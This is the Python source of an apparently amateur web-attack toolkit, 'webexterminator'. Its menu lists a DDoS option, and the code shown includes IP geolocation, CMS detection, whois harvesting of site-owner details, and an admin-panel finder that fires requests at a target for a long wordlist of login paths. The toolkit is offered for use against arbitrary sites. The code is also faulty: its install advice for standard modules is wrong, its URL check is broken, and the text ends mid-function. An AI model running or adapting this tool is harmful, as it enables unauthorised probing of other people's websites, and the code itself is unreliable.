from time import sleep
try:
 import json
except:
  print("ERROR !!! pleas install json  \n pip3 install json") 
  exit()
try:
  from colorama import Fore,init
except:
  print("ERROR !!! pleas install colorama  \n pip3 install colorama") 
  exit()
try:
  import socket
except:
  print("ERROR !!! pleas install socket  \n pip3 install socket") 
  exit()
try:
  import sys
except:
 print("ERROR !!! pleas install sys  \n pip3 install sys") 
 exit()
try:
  import time
except:
  print("ERROR !!! pleas install time  \n pip3 install time") 
  exit()
try:
  import requests
except:
  print("ERROR !!! pleas install requests  \n pip3 install requests") 
  exit()
try:
  import platform
except:
    print("ERROR !!! pleas install  platform  \n pip3 install platform") 
    exit()
try:
  import os
except:
    exit()
    print("ERROR !!! pleas install os  \n pip3 install os") 
try:
  import builtwith
except:
    print("ERROR !!! pleas install builtwith  \n pip3 install builtwith")   
    exit()
try:
  import ipapi
except:
      print("ERROR !!! pleas install ipapi  \n pip3 install ipapi")   
      exit()
try:
  import ipapi
except:
     print("ERROR !!! pleas install ipapi \n pip3 install ipapi")
     exit()
try:
   import whois     
except:
     print("ERROR !!! pleas install whois \n pip3 install whois")
     exit()
init()




#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@




def banner():
    platform_name = platform.uname()[0]

    if platform_name == "Windows":
        os.system("cls")
    if platform_name == "Linux":
        os.system("clear")


    init()
   
    print(Fore.LIGHTGREEN_EX+""" 

                     _                  _                           _                _                
                    | |                | |                         (_)              | |               
    __      __  ___ | |__    ___ __  __| |_   ___  _ __  _ __ ___   _  _ __    __ _ | |_   ___   _ __ 
    \ \ /\ / / / _ \| '_ \  / _ \\ \/ /| __| / _ \| '__|| '_ ` _ \ | || '_ \  / _` || __| / _ \ | '__|
     \ V  V / |  __/| |_) ||  __/ >  < | |_ |  __/| |   | | | | | || || | | || (_| || |_ | (_) || |   
      \_/\_/   \___||_.__/  \___|/_/\_\ \__| \___||_|   |_| |_| |_||_||_| |_| \__,_| \__| \___/ |_|   
                                                                                                    
                                                                                                    

    """)
    



#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



def home(): 
   try:   
      banner()
      time.sleep(0.3)
      print(Fore.LIGHTGREEN_EX+"[!] pleas enter your select ")
      print()
      time.sleep(0.3)

      print(Fore.LIGHTWHITE_EX+"[1] DDOSER")
      print(Fore.LIGHTBLUE_EX+"******************")
      time.sleep(0.3)
      print(Fore.LIGHTCYAN_EX+"[2] Information Gathering")
      print(Fore.LIGHTBLUE_EX+"******************")
      time.sleep(0.3)
      print(Fore.LIGHTYELLOW_EX+"[3] wordpress ") 
      time.sleep(0.3)
      print(Fore.LIGHTBLUE_EX+"******************")
      time.sleep(0.3)
      print(Fore.LIGHTRED_EX+"[4] info (***)")
      time.sleep(0.3)
      print(Fore.LIGHTBLUE_EX+"******************")     
      print(Fore.LIGHTMAGENTA_EX+"[5] Exit ...")
      print()

      print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.GREEN+"]"+Fore.RED)
      user_select = input("|________.::[")
      
      if user_select == "2":
          Informationgathering()  
          
      elif user_select == "3":
        wordpress()      
      elif user_select == "1":
        ddoser()   
      elif user_select == "4":
        info()
      else:
        pass   
   except:
     home()


#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


def cms():   
 try: 
    banner()
  
    time.sleep(3)
    Fore.RED
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter Website address")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/cms"+Fore.GREEN+"]"+Fore.RED)

    url = input("|_______.::[ ")
    Fore.LIGHTBLUE_EX
    if not "https://" in url or not "http://" in url:
            url = "https://"+ url

    info = builtwith.parse(url)

    for data in info:
            v = ''
            for value in info[str(data)]:
                Fin  = v + value
                data.replace("-"," ")
                print(Fore.GREEN+data+":"+Fin) 
    print("")
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
            cms()
    else :
        home()    
 except:
   home()



#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



def iplocation():

  
    banner()
    time.sleep(2)    
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter Website address")
    init()
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/Website location"+Fore.GREEN+"]"+Fore.RED)
    url = input("|_______.::[ ")
        
    ip_site = socket.gethostbyname(url) 
    info = ipapi.location(ip_site)



    print(Fore.LIGHTYELLOW_EX+"ip => "+info["ip"])
    print(Fore.LIGHTYELLOW_EX+"city => " +info["city"])
    print(Fore.LIGHTYELLOW_EX+"region => " + info["region"])
    print(Fore.LIGHTYELLOW_EX+"country name => "+info['country_name'])
    print(Fore.LIGHTYELLOW_EX+"country capital => "+info["country_capital"])
    print(Fore.LIGHTYELLOW_EX+"country calling code => "+ info["country_calling_code"])
    print(Fore.LIGHTYELLOW_EX+"languages => "+ info["languages"])
    print(Fore.LIGHTYELLOW_EX+"organization => "+info["org"])
    print(Fore.LIGHTYELLOW_EX+"currency name => "+info["currency_name"])
    print(Fore.LIGHTYELLOW_EX+"currency => "+info["currency"])

    print("")
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")    
    if enter == "2":
      iplocation()
    else:
      home()        




#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



def Informationgathering():
  try:
    banner()
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter your select \n")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[1] Website location")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[2] Admin page finder")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[3] Cms detect")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print (Fore.LIGHTCYAN_EX+"[4] Website admin info")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[5] Reverse_IP")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[6] view page source")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTCYAN_EX+"[7] Port scanner")
    time.sleep(0.3)
    print(Fore.LIGHTBLUE_EX+"*****************************")
    time.sleep(0.3)
    print(Fore.LIGHTWHITE_EX+"[8] back") 
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.GREEN+"]"+Fore.RED)

    user_s = input("|_______.::[ ")
    if user_s == "1":
      iplocation()
    elif user_s == "2":
      pageadminfinder()
    elif user_s == "3":
      cms()  
    elif user_s == "":
      home()   
    elif user_s == "4":
       adminsiteinfo()
    elif user_s == "5":
       Reverse_IP()      
    elif user_s == "6":
       viewpagesource()   
    elif user_s == "7":
       portscann()
    else:
      home()      
  except:
    home()



#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



def pageadminfinder():                                                                                   
  import socket
  import requests
  from colorama import Fore,init
  banner()
  time.sleep(3)
  try:
    finder_list = ['robots.txt','admin/page/','page.admin/','admin.page/','admin/','administrator/','login.php','administration/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
        'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admininfo/',''
        'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
        'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
        'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
        'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
        'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
        'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
        'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
        'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
        'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
        'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
        'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
        'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
        'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
        'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
        'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
        'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
        'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
        'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
        'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
        'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
        'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
        'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
        'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
        'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
        'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
        'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
        'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
        'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
        'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','adminLogin/','admin_area/','panel-administracion/','instadmin/','login.aspx',
        'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
        'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
        'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
        'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
        'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
        'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
        'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
        'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx','memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
        'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
        'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
        'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
        'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
        'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
        'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
        'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
        'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
        'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
        'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
        'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
        'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
        'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi','admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
        'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
        'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
        'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
        'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
        'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
        'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf','cpanel','cpanel.php','cpanel.html',
        'users/admin/index.php','users/admin/index.html','user/admin/index.html','user/admin/index.php','admin/admin.php','admin/','page/admin/','admin1/','admin2/','adm/index.html','admin/index.html/','admin/index.php','myaddmin/','adm/','masters/','masters/adminuser','masters/adminuser/index.php','admins/','admins/ajaxs/','adminpanel/','control/admin/','controladmin/','controlpanel/admin/','paneladmin/','panel/admin/','siteaddmi/','admin_area/admin.asp','memberadmin/admin.asp','member/admin/',
        'memberadmin/admin.asp','memberadmin/admin.html','memberadmin/admin.php','admin_area/admin.html','admin_area/admin.php','adminstrator/admin.asp','adminstrator/admin.php','adminarea/','admincontrol/login.php','admincontrol/login.html','admincontrol/admin',
        'account/admin/admin.php','account/admin/','account/login/admin/','account/login/ajax/admin/','accounts/login/admin/','accounts/login/ajax/admin/','admin.php','admin.html',
        'admin.asp','controladmin.asp','controladmin.php','controladmin.html','panel/admin/index.php','penel/admin/admin.asp','admins/','myadmin/','admin/admin1/','admin/adin2/','admin/admin3/','motherator/admin/admin.php','motherator/admin/admin.html','motherator/admin/admin.asp','mother/','father/','adminpage/admin.php','adminpage/admin1.php','adminpage/admin2.php','adminpagE/admin.ASP','adminpage/admin.html','user/admin/admin.php','user/admin/',
      'user/admin/admin.html','adminprofile','accounts/login/admin/','login/admin','ajx/admin/','ad/login/','siteusers/admins/']
    found_list = []
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter Website address")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/admin page finder"+Fore.GREEN+"]"+Fore.RED)

    url = input("|_______.::[ ")

    if not "https" in url or not "http" in url :
            url = "https://"+url
    siteisorno = requests.post(url)
    if siteisorno.status_code == 200:
      pass
    else:
      print(Fore.RED+"[!] site not found")
    for finder in finder_list:
            time.sleep(1)
            req = requests.post(url+"/"+finder)     
            if req.status_code == 200:
                print(Fore.GREEN+"[+]"+url+"/"+finder+" found")
                found_list.append(url+"/"+finder)
            else:
                print(Fore.RED+"[-]"+url+"/"+finder+" Not found")

      
    print(Fore.BLUE+"Number of directories tested => "+str(finder_list.__len__())+Fore.WHITE+" || "+Fore.BLUE+"Number of directories found =>"+str(found_list.__len__()))
    for found in found_list:
          print(Fore.LIGHTGREEN_EX+"directories found =>"+found)         
    print("")
      
        
    print("")
        
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
          pageadminfinder()
    else:
          home()         
  except:
   home() 



#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


def adminsiteinfo():
 try:
    import whois
    from colorama import Fore,init
   
    banner()
    time.sleep(2)
    init()

    print(Fore.LIGHTGREEN_EX+"[!] pleas enter Website address")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/Admin site info"+Fore.GREEN+"]"+Fore.RED)

    url = input("|_______.::[ ")

    whois = whois.whois(url)

    domin_name = whois["domain_name"]
    updated_date = whois["updated_date"]
    creation_date = whois["creation_date"]
    expiration_date = whois["expiration_date"]
    name_servers = whois["name_servers"]
    emails = whois["emails"]
    admin_name = whois["name"]
    admin_organization = whois["org"]
    admin_address = whois["address"]
    addmin_city = whois["city"]
    admin_state = whois["state"]
    admin_country = whois["country"]
    admin_zipcode = whois["zipcode"] 


    number = 0

    if domin_name == None:
        pass
    else:
     for name in domin_name:
        number += 1 
        print(Fore.LIGHTYELLOW_EX+"name "+str(number)+": "+name)

    number = 0

    if updated_date == None:
        pass
    else:
        print(Fore.LIGHTYELLOW_EX+"Start date of the latest update : "+ str(updated_date[0]))
        print(Fore.LIGHTYELLOW_EX+"Expiry date of the last update : "+ str(updated_date[1]))     

    if  creation_date == None:
        pass
    else:
        print(Fore.LIGHTYELLOW_EX+"creation date : "+str(creation_date[0]))

   
          
    number = 0

    if name_servers == None:
        pass
    else :
